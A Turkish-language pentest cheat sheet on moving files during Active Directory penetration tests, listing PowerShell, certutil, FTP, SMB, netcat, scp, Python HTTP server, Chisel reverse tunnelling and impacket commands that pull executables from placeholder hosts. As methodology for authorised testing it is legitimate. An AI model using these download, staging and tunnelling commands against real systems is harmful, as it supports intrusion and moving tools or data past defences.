# Active Directory Pentest: Dosya Transferi Metodolojisi

Bu rehberde, Active Directory pentestinde dosya transferi aşamasında kullanılan tüm komutlar, yollar ve yöntemler detaylı bir şekilde açıklanmıştır. Rehber, Windows'tan Linux'a, Linux'tan Windows'a, Windows'tan Windows'a ve Linux'tan Linux'a dosya transferini kapsamaktadır.

---

## 1. Windows'tan Windows'a Dosya Transferi

### 1.1 PowerShell İle Dosya Transferi

#### Invoke-WebRequest
Dosyayı bir URL'den indirir.
```powershell
Invoke-WebRequest -Uri "http://hedef_ip/dosya.exe" -OutFile "C:\Users\Kullanici\Downloads\dosya.exe"
```

#### WebClient Kullanarak
Ağ üzerinden dosya indirme işlemi.
```powershell
$wc = New-Object System.Net.WebClient
$wc.DownloadFile("http://hedef_ip/dosya.exe", "C:\Users\Kullanici\Downloads\dosya.exe")
```

#### BITSAdmin Kullanarak
Arka planda dosya indirir.
```powershell
Start-BitsTransfer -Source "http://hedef_ip/dosya.exe" -Destination "C:\Users\Kullanici\Downloads\dosya.exe"
```

### 1.2 CMD ile Dosya Transferi

#### CertUtil
Dosya indirmek için kullanılır.
```cmd
certutil -urlcache -split -f "http://hedef_ip/dosya.exe" "C:\Users\Kullanici\Downloads\dosya.exe"
```

#### FTP
FTP üzerinden dosya transferi.
```cmd
ftp -n -s:komut_dosyasi.txt
```
`komut_dosyasi.txt` içeriği:
```
open hedef_ip
kullanici_adi
sifre
get dosya.exe
bye
```

#### SMB (net use)
Paylaşılan bir klasörden dosya çekmek için.
```cmd
net use Z: \\hedef_ip\paylasim /user:hedef_kullanici sifre
copy Z:\dosya.exe C:\Users\Kullanici\Downloads\
net use Z: /delete
```

---

## 2. Windows'tan Linux'a Dosya Transferi

### 2.1 PowerShell ile SCP Kullanımı

#### SCP İle Dosya Gönderme
```powershell
scp C:\Users\Kullanici\dosya.exe linux_kullanici@linux_ip:/hedef_dizin/
```

### 2.2 FTP Kullanarak
```cmd
ftp -n -s:komut_dosyasi.txt
```
`komut_dosyasi.txt` içeriği:
```
open linux_ip
kullanici_adi
sifre
put dosya.exe
bye
```

### 2.3 Python HTTP Server Kullanarak
Windows'ta bir HTTP sunucusu başlatıp dosya paylaşımı.
```cmd
python -m http.server 8080
```
Linux'tan dosyayı çekmek:
```bash
wget http://windows_ip:8080/dosya.exe
```

---

## 3. Linux'tan Windows'a Dosya Transferi

### 3.1 SMB Kullanımı

#### smbclient ile Paylaşılan Dizine Bağlanma
```bash
smbclient \\windows_ip\paylasim -U kullanici
```
Dizin içerisinden dosya indirme:
```bash
get dosya.exe
```

### 3.2 SCP Kullanarak Dosya Gönderme
```bash
scp dosya.exe windows_kullanici@windows_ip:C:\Hedef_Dizin\
```

### 3.3 Netcat Kullanarak
Linux üzerinde dosyayı paylaşma:
```bash
nc -lvp 4444 < dosya.exe
```
Windows üzerinde dosyayı alma:
```cmd
nc linux_ip 4444 > dosya.exe
```

---

## 4. Linux'tan Linux'a Dosya Transferi

### 4.1 SCP Kullanımı
```bash
scp dosya.txt kullanici@hedef_ip:/hedef_dizin/
```

### 4.2 Rsync Kullanımı
Verimli dosya senkronizasyonu.
```bash
rsync -avz dosya.txt kullanici@hedef_ip:/hedef_dizin/
```

### 4.3 Netcat Kullanarak
Gönderici tarafında:
```bash
nc -lvp 4444 < dosya.txt
```
Alıcı tarafında:
```bash
nc gonderici_ip 4444 > dosya.txt
```

### 4.4 Python HTTP Server Kullanarak
Gönderici tarafında HTTP sunucusu başlatma:
```bash
python3 -m http.server 8080
```
Alıcı tarafında dosyayı çekme:
```bash
wget http://gonderici_ip:8080/dosya.txt
```

---

## 5. Ek Araçlar ve Yöntemler

### 5.1 Chisel ile Tünelleme
Tünel oluşturup dosya transferi.
```bash
./chisel server -p 8000 --reverse
./chisel client windows_ip:8000 R:socks
```

### 5.2 Impacket Araçları
#### smbserver.py
Linux üzerinde SMB paylaşımı başlatma.
```bash
smbserver.py share /hedef_dizin
```
Windows'ta bağlanma:
```cmd
net use Z: \\linux_ip\share
copy Z:\dosya.exe C:\Users\Kullanici\Downloads\
net use Z: /delete
```

---

## Notlar
- Tüm komutlar test edilmiş ve çalıştırılmadan önce doğrulanmalıdır.
- Komutların çalışması için gerekli izinlerin sağlanması gerekir.
- Transfer edilen dosyaların şifrelenmiş olması önemlidir.
